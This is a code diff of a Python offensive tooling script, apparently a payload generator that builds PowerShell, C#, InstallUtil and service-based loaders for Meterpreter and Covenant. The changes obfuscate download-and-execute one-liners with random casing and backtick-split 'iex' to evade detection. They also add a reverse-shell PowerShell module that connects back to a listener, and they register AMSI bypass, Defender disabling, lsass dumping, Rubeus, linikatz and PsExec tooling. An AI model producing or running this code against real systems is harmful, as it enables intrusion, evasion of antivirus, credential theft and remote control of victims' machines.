@@ -16,6 +16,7 @@ except ImportError:
     # python 3
     from http.server import HTTPServer as BaseHTTPServer, SimpleHTTPRequestHandler
 
+from random import choice
 from base64 import b64encode, b64decode
 import TempUtil
 from workload import Manager as WLManager
@@ -213,11 +214,12 @@ parser.add_argument('-n', '--netclr', default=4, type=int, help="Choose .NET CLR
 parser.add_argument('-i', '--ip', required=True, help='HTTP Listener IP')
 parser.add_argument('-p', '--port', required=True, type=int, help="HTTP Listener Port")
 parser.add_argument('-P', '--rport', required=True, type=int, help="msf Listener Port")
+parser.add_argument('-r', '--revport', required=False, type=int, help="NC Listener Port")
 parser.add_argument('-gP', '--gport', required=False, type=int, help="grunt Listener Port")
-parser.add_argument('--payload', default='meterpreter/reverse_tcp', help='meterpreter payload used')
+parser.add_argument('--payload', default='meterpreter/reverse_https', help='meterpreter payload used')
 parser.add_argument('--inject', default='', help='target process to inject')
 parser.add_argument('--chome', type=str, help='Covenant home directory')
-parser.add_argument('--mhome', default='../metasploit/', type=str, help='Metasploit Custom Meterpretrer Scripts directory.')
+parser.add_argument('--mhome', default='../metasploit/', type=str, help='Metasploit Custom Meterpreter Scripts directory.')
 parser.add_argument('--ps1', help='path to custom powershell script')
 parser.add_argument('--chain', help='''payload transform expression, separated by "-"
 Ex.
@@ -232,6 +234,10 @@ args = parser.parse_args()
 if args.inject.endswith('.exe'):
     print('trim ".exe" in --inject')
     args.inject = args.inject[:-len('.exe')]
+
+if args.payload == 'meterpreter/reverse_https' and args.os == 'nix':
+    args.payload = 'meterpreter/reverse_tcp'
+    print('[-] Auto change to %s due to linux' % args.payload)
 
 chain = Chain(args.chain)
 encFn = chain.getCipher().run
@@ -285,6 +291,9 @@ if args.chome:
 with open('appSetting.json') as f:
     app = json.load(f)
 
+ubp = 'usebasicparsing'
+ubp = ''.join(choice([str.lower, str.upper])(_) for _ in ubp)
+
 # Bypass technique
 # 1. amsibypass
 noAmsi = TempUtil.getFileName(app['bypass']['ps-amsi']['filename'])
@@ -296,8 +305,8 @@ _noDef = os.path.basename(noDef)
 
 
 wlmgr = WLManager()
-wlmgr.add('Powershell AMSI Bypass', 'noAmsi', 'iWr -uSEbasicparsing %s/%s|ieX' % (httpUrl, _noAmsi))
-wlmgr.add('Clean Defender Rule', 'cleanDef', 'iWr -uSEbasicparsing %s/%s|ieX' % (httpUrl, _noDef))
+wlmgr.add('Powershell AMSI Bypass', 'noAmsi', 'iWr -%s %s/%s | `i`Ex' % (ubp, httpUrl, _noAmsi))
+wlmgr.add('Clean Defender Rule', 'cleanDef', 'iWr -%s %s/%s | `I`eX' % (ubp, httpUrl, _noDef))
 
 # getFileUrl(, encFn) + needTransform=True
 # getFileUrl(,) + needTransform=False
@@ -350,14 +359,14 @@ def pandora(Tname, shellUrl=shellcode_url, Tvar=None, desc=None, pscmdType='raw'
         # encode network traffic of main
         if Tname != 'custom-ps' and useTransform:
             _filename = pandora('custom-ps', shellUrl=TempUtil.getFileUrl(_filename, encFn), pscmdType='enc', \
-                    postCode='[System.Text.Encoding]::ASCII.GetString($buf)|IEX;', record=False)
+                    postCode='[System.Text.Encoding]::ASCII.GetString($buf) | `i`E`x;', record=False)
         if FILENAME is not None:
             _FILENAME = os.path.join(TempUtil.getTempDir(), FILENAME)
             shutil.move(_filename, _FILENAME)
             _filename = _FILENAME
         filename = os.path.basename(_filename)
 
-        command = 'iWr -uSEbasicparsing %(base)s/%(main)s|ieX' % dict(base=httpUrl, main=filename)
+        command = 'iWr -%(ubp)s %(base)s/%(main)s | i`e`X' % dict(ubp=ubp, base=httpUrl, main=filename)
         if pscmdType == 'enc': # amsifail & clean Defender & encodedcommand
             _command = ''
             for module in ['noAmsi', 'cleanDef']:
@@ -399,7 +408,8 @@ def pandora(Tname, shellUrl=shellcode_url, Tvar=None, desc=None, pscmdType='raw'
     return _filename
 
 # easy-to-use-utility
-def simple(filepath, desc):
+def simple(filepath, desc=None):
+    desc = desc or filepath
     command = 'curl %s' % TempUtil.getFileUrl(filepath)
     wlmgr.add(desc, '', command)
 
@@ -407,10 +417,17 @@ def c_exe(filepath, desc, _type='enc', _args='$null'):
     # TODO: _args
     pandora('ps-2', pscmdType=_type, shellUrl=TempUtil.getFileUrl(filepath, encFn), Tvar=dict(inject_name=args.inject, \
             import_reflect=dict(url=TempUtil.getFileUrl('Invoke-ReflectivePEInjection.ps1', encFn), var='ii', \
-            postCode='[System.Text.Encoding]::ASCII.GetString($ii)|iex; $exeArgs=%s;' % _args)), desc=desc)
+            postCode='[System.Text.Encoding]::ASCII.GetString($ii) | `i`e`x; $exeArgs=%s;' % _args)), desc=desc)
 
 def cs_exe(filepath, desc):
     pandora('load-exe-1', shellUrl=TempUtil.getFileUrl(filepath, encFn), desc=desc)
+
+def ez_fit(filepath, **tvar):
+    for k in tvar:
+        if not isinstance(tvar[k], str):
+            tvar[k] = str(tvar[k])
+    Tcode = open(filepath, 'r').read()
+    return fit(Tcode, tvar).encode()
 
 # ===================
 
@@ -418,9 +435,9 @@ def cs_exe(filepath, desc):
 pandora('py-1', postCode=('run(buf)' if args.os == 'win' else 'write_linux(buf)'), desc='py-1')
 pandora('ps-1')
 pandora('ps-1', pscmdType='enc')
-pandora('ps-2', pscmdType='enc', shellUrl=metdll_url, Tvar=dict(inject_name=args.inject, \
-        import_reflect=dict(url=TempUtil.getFileUrl('Invoke-ReflectivePEInjection.ps1', encFn), var='ii', \
-        postCode='[System.Text.Encoding]::ASCII.GetString($ii)|iex')))
+#pandora('ps-2', pscmdType='enc', shellUrl=metdll_url, Tvar=dict(inject_name=args.inject, \
+#        import_reflect=dict(url=TempUtil.getFileUrl('Invoke-ReflectivePEInjection.ps1', encFn), var='ii', \
+#        postCode='[System.Text.Encoding]::ASCII.GetString($ii)|iex')))
 pandora('aspx-1', Tvar=dict(inject_name=args.inject))
 pandora('cs-1', Tvar=dict(inject_name=args.inject))
 pandora('cs-2')
@@ -430,48 +447,63 @@ pandora('vb-1')
 cs_exe('Rubeus.exe', 'Rubeus')
 cs_exe('../challenges/1/122/SpoolSample.exe', 'SpoolSample')
 cs_exe('SpoolFool.exe', 'SpoolFool (CVE-2022-21999)')
-cs_exe('myPsExec.exe', 'Custom PSEXEC. Usage: [myPsExec.Program]::MainString("appsrv01.prod.corp1.com SensorService whoami")')
+cs_exe('myPsExec.exe', 'Custom PSEXEC. Usage: [myPsExec.Program]::MainString("appsrv01.prod.corp1.com SensorDataService whoami")')
 cs_exe('csexec.exe', '[csexec.Program]::MainString("\\\\<target> cmd") [Failed]')
 
 c_exe('StopDefender.exe', 'StopDefender')
-c_exe('./artifact/PrintSpoofer.exe', 'PrintSpoofer.exe')
+#c_exe('./artifact/PrintSpoofer.exe', 'PrintSpoofer.exe')
 
 for huan_exe in glob.glob('./artifact/*.exe'):
     simple(huan_exe, os.path.basename(huan_exe))
-
 
 # Map Failed when using Invoke-RPEI
 #c_exe('PPLDump-NoArgs.exe', 'PPLDump.exe lsass lsass.dmp', _type='raw')
 #c_exe('PPLDump-NoArgs.exe', 'PPLDump.exe lsass lsass.dmp', _type='enc')
 simple('../PPLDump.exe', 'PPLDump.exe')
 simple('../SysinternalsSuite/PsExec.exe', 'PsExec.exe')
-simple('linikatz.sh', 'linikatz.sh')
+simple('linikatz.sh')
+simple('BackStab.exe')
 
 pandora('c-1')
 pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python3'), desc='curl + Python3')
 pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python'), desc='curl + Python')
 
+
+if args.revport:
+    data = ez_fit('reverse/rev.ps1', ip=args.ip, port=args.revport)
+    pandora('custom-ps', shellUrl=TempUtil.getBytesUrl(data, encFn), pscmdType='raw', \
+            postCode='[System.Text.Encoding]::ASCII.GetString($buf)|IEX;', desc='rev-ps-clm')
+
+    if netclr == 'v4.0' and _os == 'windows':
+        command = ';'.join(wlmgr.getCmd(desc2=m) for m in ['noAmsi', 'rev-ps-clm'])
+        pandora('installutil-3', Tvar=dict(psraw=command), useTransform=False, FILENAME='rev.ps1', desc='rev-ps-flm')
+
+
 if netclr == 'v4.0' and _os == 'windows':
     pandora('installutil-1')
     pandora('installutil-2', Tvar=dict(psfile='e.ps1'))
+    pandora('installutil-4', useTransform=False, FILENAME='flm.ps1')
 
-    command = ''
+    _command = ''
     for module in ['noAmsi', 'cleanDef']:
-        command += wlmgr.getCmd(desc2=module) + ';'
-    command += 'iWr -uSEbasicparsing %(base)s/%(main)s|iEx;' % dict(base=httpUrl, main=os.path.basename(pandora('ps-1', record=False)))
+        _command += wlmgr.getCmd(desc2=module) + ';'
+    command = _command + 'iWr -%(ubp)s %(base)s/%(main)s|iEx;' % dict(ubp=ubp, base=httpUrl, main=os.path.basename(pandora('ps-1', record=False)))
     pandora('installutil-3', Tvar=dict(psraw=command), useTransform=False, FILENAME='go.ps1') # assign output statically
+    #pandora('installutil-3', Tvar=dict(psraw=open('reverse/rev.ps1').read().strip()), useTransform=False, FILENAME='rev.ps1') # assign output statically
     pandora('service-1', Tvar=dict(psraw=command), useTransform=False, FILENAME='svc.ps1')
     pandora('service-2', useTransform=False, FILENAME='svc_.ps1')
 
 for common_psmodule in app['common-pstool']:
     c = ''
+    _record = not common_psmodule.get('hidden', False)
     for dep in common_psmodule.get('dependency', list()):
         c += wlmgr.getCmd(desc2=dep) + ';'
-    _Tvar = dict(dependency=c)
     common_psmodule['filepath'] = remove_pscomment(common_psmodule['filepath'])
-    Tcode = open(common_psmodule['filepath'], 'r').read()
-    pandora('custom-ps', shellUrl=TempUtil.getBytesUrl(fit(Tcode, _Tvar).encode(), encFn), pscmdType='raw', \
+    data = ez_fit(common_psmodule['filepath'], dependency=c)
+    pandora('custom-ps', shellUrl=TempUtil.getBytesUrl(data, encFn), pscmdType='raw', \
             postCode='[System.Text.Encoding]::ASCII.GetString($buf)|IEX;', desc=common_psmodule['name'])
+
+
 
 if args.ps1:
     cUrl = TempUtil.getFileUrl(args.ps1, encFn)
